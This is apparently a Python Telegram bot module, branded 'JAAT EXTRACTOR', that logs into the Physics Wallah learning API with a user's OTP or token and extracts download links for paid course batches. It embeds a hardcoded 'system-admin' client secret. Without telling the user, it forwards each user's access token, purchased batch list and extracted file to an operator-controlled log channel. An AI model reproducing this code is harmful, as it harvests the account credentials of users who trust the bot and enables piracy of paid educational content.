import requests
import asyncio
from pyrogram import Client, filters
import requests, os, sys, re
import math
import json, asyncio
from config import PREMIUM_LOGS
import subprocess
import datetime
from Extractor import app
from pyrogram import filters
from subprocess import getstatusoutput
log_channel = PREMIUM_LOGS

@app.on_message(filters.command(["pw"]))
async def pw_login(app, message):
    try:
        query_msg = await app.ask(
            chat_id=message.chat.id,
            text="🔐 **Enter your PW Mobile No. (without country code) or your Login Token:")
                 
        
        user_input = query_msg.text.strip()

        if user_input.isdigit():
            mob = user_input
            payload = {
                "username": mob,
                "countryCode": "+91",
                "organizationId": "5eb393ee95fab7468a79d189"
            }
            headers = {
                "client-id": "5eb393ee95fab7468a79d189",
                "client-version": "12.84",
                "Client-Type": "MOBILE",
                "randomId": "e4307177362e86f1",
                "Accept": "application/json, text/plain, */*",
                "Content-Type": "application/json"
            }
            
            await app.send_message(message.chat.id, "🔄 **Sending OTP... Please wait!**")
            otp_response = requests.post(
                "https://api.penpencil.co/v1/users/get-otp?smsType=0", 
                headers=headers, 
                json=payload
            ).json()

            if not otp_response.get("success"):
                await message.reply_text("❌ **Invalid Mobile Number! Please provide a valid PW login number.**")
                return
            
            await app.send_message(message.chat.id, "✅ **OTP sent successfully! Please enter your OTP:**")
            otp_msg = await app.ask(message.chat.id, text="🔑 **Enter the OTP you received:**")
            otp = otp_msg.text.strip()

            token_payload = {
                "username": mob,
                "otp": otp,
                "client_id": "system-admin",
                "client_secret": "KjPXuAVfC5xbmgreETNMaL7z",
                "grant_type": "password",
                "organizationId": "5eb393ee95fab7468a79d189",
                "latitude": 0,
                "longitude": 0
            }
            
            await app.send_message(message.chat.id, "🔄 **Verifying OTP... Please wait!**")
            token_response = requests.post(
                "https://api.penpencil.co/v3/oauth/token", 
                data=token_payload
            ).json()
            
            token = token_response.get("data", {}).get("access_token")
            if not token:
                await message.reply_text("❌ **Login failed! Invalid OTP.**")
                return
            
            dl = (f"✅ ** PW Login Successful!**\n\n🔑 **Here is your token:**\n`{token}`")
            await message.reply_text(f"✅ **Login Successful!**\n\n🔑 **Here is your token:**\n`{token}`")
            await app.send_message(log_channel, dl)
        
        elif user_input.startswith("e"):
            token = user_input
        else:
            await message.reply_text("❌ **Invalid input! Please provide a valid mobile number or token.**")
            return


        headers = {
            "client-id": "5eb393ee95fab7468a79d189",
            "client-type": "WEB",
            "Authorization": f"Bearer {token}",
            "client-version": "3.3.0",
            "randomId": "04b54cdb-bf9e-48ef-974d-620e21bd3e23",
            "Accept": "application/json, text/plain, */*"
        }
        
        batch_response = requests.get(
            "https://api.penpencil.co/v3/batches/my-batches?mode=1&amount=paid&page=1", 
            headers=headers
        ).json()
        
        batches = batch_response.get("data", [])
        if not batches:
            await message.reply_text("❌ **No batches found for this account.**")
            return


        batch_text = "📚 **Your Batches:**\n\n"
        batch_map = {}
        for batch in batches:
            bi = batch.get("_id")
            bn = batch.get("name")
            batch_text += f"📖 `{bi}` → **{bn}**\n"
            batch_map[bi] = bn

        query_msg = await app.send_message(
            chat_id=message.chat.id, 
            text=batch_text + "\n\n💡 **Please enter the Course ID to continue:**",
            reply_markup=None
        )
        
        target_id_msg = await app.ask(message.chat.id, text="🆔 **Enter the Course ID here:**")
        target_id = target_id_msg.text.strip()


        if target_id not in batch_map:
            await message.reply_text("❌ **Invalid Course ID! Please try again.**")
            return

        batch_name = batch_map[target_id]
        filename = f"{batch_name.replace('/', '_').replace(':', '_').replace('|', '_')}.txt"

        await app.send_message(
            chat_id=message.chat.id, 
            text=f"🕵️ **Fetching details for Batch:** **{batch_name}**... Please wait!"
        )
        course_response = requests.get(
            f"https://api.penpencil.co/v3/batches/{target_id}/details", 
            headers=headers
        ).json()
        
        subjects = course_response.get("data", {}).get("subjects", [])
        if not subjects:
            await message.reply_text("❌ **No subjects found for the selected course.**")
            return

        with open(filename, 'w') as f:
            for subject in subjects:
                si = subject.get("_id")
                sn = subject.get("subject")
                await app.send_message(
                    chat_id=message.chat.id, 
                    text=f"📘 **Processing Subject:** **{sn}**... ⏳"
                )
                
                for page in range(1, 12):
                    content_response = requests.get(
                        f"https://api.penpencil.co/v2/batches/{target_id}/subject/{si}/contents?page={page}&contentType=exercises-notes-videos", 
                        headers=headers
                    ).json()
                    
                    for item in content_response.get("data", []):
                        topic = item.get("topic", "").replace(":", "_")
                        url = item.get("url", "")
                        if url:
                            f.write(f"{topic}:{url}\n")

                        for hw in item.get("homeworkIds", []):
                            for attachment in hw.get("attachmentIds", []):
                                name = attachment.get("name", "").replace(":", "_")
                                base_url = attachment.get("baseUrl", "")
                                key = attachment.get("key", "")
                                if key:
                                    f.write(f"{name}:{base_url}{key}\n")
                

        up = (f"**Login Succesfull for PW:** `{token}`")
        captionn = (f" App Name : Physics Wallah \n\n PURCHASED BATCHES : {batch_text}")
        await app.send_document(
            chat_id=message.chat.id, 
            document=filename, 
            caption=f"App Name: PHYSICS WALLAH \n\n 🆔** Batch ID:** **{target_id}**\n📂 **Batch:** **{batch_name}**✅\n \n\n  **╾───• JAAT EXTRACTOR •───╼** "
        )
        await app.send_document(log_channel, document=filename, caption = captionn)
        await app.send_message(log_channel , up)

    except Exception as e:
        await message.reply_text(f"❌ **An error occurred:** `{str(e)}`")
            
